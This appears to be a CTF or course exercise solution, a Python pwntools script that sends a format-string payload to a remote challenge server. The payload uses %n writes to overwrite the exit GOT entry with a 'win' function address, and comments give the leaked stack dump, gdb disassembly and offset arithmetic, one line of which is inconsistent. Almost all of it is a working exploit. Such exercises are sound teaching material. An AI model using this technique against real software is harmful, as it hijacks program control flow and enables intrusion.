from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = "22197"

r = remote(SERVER,PORT)

msg = (b"AAAA" + b"%08x."*20)

msg = (                                             # 0x804a018
        b"\x18\xa0\x04\x08" + 
        b"\x19\xa0\x04\x08" +
        b"\x20\xa0\x04\x08" +
        b"\x21\xa0\x04\x08" +
        b"%139x%7$n"+
        b"%184x%8$n"+
        b"%128x%9$n"+
        b"%4x%10$n"
       )

#msg = (b"AAAA" + b"%08x."*7)

#msg = (b"\x47\xa0\x04\x08" + b"%10x" + b"%7$hhn")

r.sendline(msg)

print(f"Flag: {r.recvall()}")

r.close()



"""

AAAAffffdc7c.0000007f.ffffdcd8.f7ffda74.00000001.f7fd3490.41414141.
78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78


win address:
gdb-peda$ x win
0x804849b <win>:	0x83e58955
^^^^

exit in vuln address: (disassemble vuln)
0x0804851a, and call 0x8048370

now disassemble call:
   0x08048370 <+0>:	jmp    DWORD PTR ds:0x804a018
   0x08048376 <+6>:	push   0x18
   0x0804837b <+11>:	jmp    0x8048330
   
now disassemble jmp:
0x804a018 this is the address we want to change to win


9b - 10 = 139 
184 - 9b = 184
104 - 84 = 128
08 - 04 = 4
   

"""